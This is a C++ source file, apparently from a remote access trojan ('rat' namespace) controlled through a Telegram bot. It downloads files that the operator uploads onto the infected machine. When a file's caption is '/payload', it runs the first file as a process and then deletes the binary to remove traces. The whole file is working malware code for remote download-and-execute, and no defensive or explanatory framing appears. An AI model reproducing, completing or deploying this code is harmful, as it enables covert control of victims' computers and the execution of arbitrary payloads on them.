#include "rat/Handler.hpp"
#include "rat/encryption/encryption.hpp"
#include "rat/encryption/xor.hpp"
#include "rat/handler/debug.hpp"
#include "rat/system.hpp"

#include <filesystem>
#include <fmt/core.h>
#include <sstream>
#include <streambuf>
#include <vector>

namespace rat::handler {

inline std::vector<std::filesystem ::path> Handler::downloadMultipleFiles(
    ::rat::tbot::BaseBot *Tbot_Bot,
    const std::vector<::rat::tbot::File> &Tbot_Files) {
	std::ostringstream response_buffer;
	std::filesystem::path file_path;
	std::vector<std::filesystem::path> downloaded_files;
	downloaded_files.reserve(Tbot_Files.size());

		for(const auto &file : Tbot_Files) {
			file_path = std::filesystem::current_path();
				if(file.name.has_value() && !file.name->empty()) {
					file_path /= file.name.value();
				}
				else {
					file_path /= rat::system::getCurrentDateTime_Underscored();
				}
			HANDLER_DEBUG_LOG("We have file {} trying to download it",
			                  file_path.string());
				if(Tbot_Bot->downloadFile(file.id, file_path)) {
					response_buffer << "File: " << file_path.string()
					                << " has been downloaded\n";
					downloaded_files.push_back(std::move(file_path));
				}
				else {
					response_buffer << "File: " << file_path.string()
					                << " has not been downloaded\n";
				}
		}
	Tbot_Bot->sendMessage(response_buffer.str());
	downloaded_files.shrink_to_fit();
	return downloaded_files;
}

inline void Handler::handlePayload(::rat::tbot::Message &Tbot_Message,
                                   const std::filesystem::path &Payload_Path) {
		if(Tbot_Message.caption.value() != "/payload") {
			return;
		}
	const std::string &dummy_telegram_message =
	    fmt::format("/lprocess {}", Payload_Path.string());
	HANDLER_DEBUG_LOG("Dummy telegram message created and assinged");
	Tbot_Message.text = std::move(dummy_telegram_message);

	this->parseTelegramMessageToCommand();

	this->handleProcessCommand();

	HANDLER_DEBUG_LOG("The payload launched, removing binary");

	std::filesystem::remove(Payload_Path);
}

void Handler::handleMessageWithUploadedFiles() {
		if(this->telegram_update->message.files.empty()) {
			return;
		}
	HANDLER_DEBUG_LOG("Uploaded file caption {}\nNumber of uploaded files{}",
	                  this->telegram_update->message.caption.value_or("None"),
	                  this->telegram_update->message.files.size());
	const auto file_paths = this->downloadMultipleFiles(
	    this->bot.get(), this->telegram_update->message.files);
		if(!file_paths.empty()) {
			this->handlePayload(this->telegram_update->message, file_paths[0]);
		}
}

} // namespace rat::handler

#undef HANDLER_DEBUG_LOG
#undef HANDLER_ERROR_LOG
#ifdef DEBUG_RAT_HANDLER
#undef DEBUG_RAT_HANDLER
#endif
